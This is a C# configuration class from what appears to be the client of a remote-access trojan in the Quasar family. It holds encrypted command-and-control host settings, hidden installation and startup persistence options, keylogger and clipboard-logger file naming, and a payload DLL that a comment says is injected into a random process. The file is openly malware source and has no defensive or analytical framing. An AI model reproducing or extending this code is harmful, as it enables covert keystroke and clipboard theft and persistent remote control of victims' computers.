using ByteEncodings;
using Q3C273.Shared.Cryptography;
using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Ton618.Config
{
    /// <summary>
    /// Stores the configuration of the client.
    /// </summary>
    public static class Settings
    {
        #region Values set from Client Builder
#if DEBUG
        public static string VERSION = Application.ProductVersion;
        public static string HOSTS = "localhost:4782;";
        public static int RECONNECTDELAY = 500;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "Test";
        public static string INSTALLNAME = "test.exe";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
        public static string STARTUPKEY = "Test key";
        public static bool HIDEFILE = false;
        public static bool ENABLELOGGER = false;
        public static string ENCRYPTIONKEY = "CFCD0759E20F29C399C9D4210BE614E4E020BEE8";
        public static string TAG = "DEBUG";
        public static string LOGDIRECTORYNAME = "Logs";
        public static string SERVERSIGNATURE = "";
        public static string SERVERCERTIFICATESTR = "";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static bool HIDELOGDIRECTORY = false;
        public static bool HIDEINSTALLSUBDIRECTORY = false;
        public static string INSTALLPATH = "";
        public static string LOGSPATH = "";
        public static bool UNATTENDEDMODE = true;
        public static string PayloadDll = "";

        public static bool Initialize()
        {
            SetupPaths();
            return true;
        }
#else
        public static string VERSION = "";
        public static string HOSTS = "";
        public static int RECONNECTDELAY = 5000;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "";
        public static string INSTALLNAME = "";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "";
        public static string STARTUPKEY = "";
        public static bool HIDEFILE = false;
        public static bool ENABLELOGGER = false;
        public static string ENCRYPTIONKEY = "";
        public static string TAG = "";
        public static string LOGDIRECTORYNAME = "";
        public static string SERVERSIGNATURE = "";
        public static string SERVERCERTIFICATESTR = "";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static bool HIDELOGDIRECTORY = false;
        public static bool HIDEINSTALLSUBDIRECTORY = false;
        public static string INSTALLPATH = "";
        public static string LOGSPATH = "";
        public static bool UNATTENDEDMODE = false;
        public static string PAYLOADDLL = ""; // Will be DLL-injected to random process

        public static bool Initialize()
        {
            if (string.IsNullOrEmpty(VERSION))
                return false;
            var aes = new Aes256(ENCRYPTIONKEY);
            TAG = aes.Decrypt(TAG);
            VERSION = aes.Decrypt(VERSION);
            HOSTS = aes.Decrypt(HOSTS);
            SUBDIRECTORY = aes.Decrypt(SUBDIRECTORY);
            INSTALLNAME = aes.Decrypt(INSTALLNAME);
            MUTEX = aes.Decrypt(MUTEX);
            STARTUPKEY = aes.Decrypt(STARTUPKEY);
            LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
            SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
            SERVERCERTIFICATE = new X509Certificate2(Alphabet.Base95Alphabet.GetBytes(aes.Decrypt(SERVERCERTIFICATESTR)).ToArray());
            PAYLOADDLL = aes.Decrypt(PAYLOADDLL);
            SetupPaths();
            return VerifyHash();
        }
#endif
        #endregion

        #region Additional hard-coded constants
        public static string GetKeyLogFileNameFormat(int index) => string.Format("k_{0}.LOG", Sha256.ComputeHash(DateTime.UtcNow.ToString("yyyy*MM!dd") + index.ToString("X04")));

        public static string GetClipLogFileNameFormat(int index) => string.Format("c_{0}.LOG", Sha256.ComputeHash(DateTime.UtcNow.ToString("yyyy(MM#dd") + index.ToString("X04")));

        public static long KeyLogFlushInterval = 15000; // 15 seconds
        public static long KeyLogRollSize = 5 * 1024 * 1024; // 5 MiB;
        #endregion

        static void SetupPaths()
        {
            LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + Path.DirectorySeparatorChar : "") + INSTALLNAME);
        }

        static bool VerifyHash()
        {
            try
            {
                var csp = (RSACryptoServiceProvider)SERVERCERTIFICATE.PublicKey.Key;
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)), CryptoConfig.MapNameToOID("SHA256"),
                    Alphabet.Base95Alphabet.GetBytes(SERVERSIGNATURE).ToArray());

            }
            catch (Exception e)
            {
                return false;
            }
        }
    }
}
